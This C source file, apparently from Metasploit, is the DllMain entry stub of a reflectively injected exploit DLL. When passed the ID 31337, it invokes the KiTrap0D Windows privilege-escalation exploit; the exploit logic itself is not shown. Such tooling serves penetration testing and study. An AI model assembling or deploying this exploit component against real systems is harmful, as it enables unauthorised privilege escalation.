/*!
 * @file elevate.c
 * @brief Entry point and intialisation definitions for the elevation exploit.
 */

#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../common/ReflectiveLoader.c"

#include "../common/common.h"
#include "kitrap0d.h"

/*! @brief ID that is used by the caller when the KiTrap0D exploit is to be run. */
#define RUN_EXPLOIT_KITRAP0D 31337

/*!
 * @brief Entry point to the exploit DLL.
 * @param hinstDLL Reference to the DLL's module.
 * @param dwReason The reason code for the invocation.
 * @param lpReserved A reserved value, used by the exploit code.
 *                     - \c RUN_EXPLOIT_KITRAP0D - Execute the KiTrap0d exploit.
 * @returns \c TRUE all the time.
 * @remark The \c lpReserved value contains a number which identifies which
 *         exploit to invoke. This needs to be passed in from MSF, otherwise
 *         no exploit funtionality will be invoked.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	DWORD dwExploit = 0;
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		dwExploit = (DWORD)lpReserved;
		if (dwExploit == RUN_EXPLOIT_KITRAP0D) {
			elevate_via_exploit_kitrap0d(hinstDLL);
		}
		break;
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL) {
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}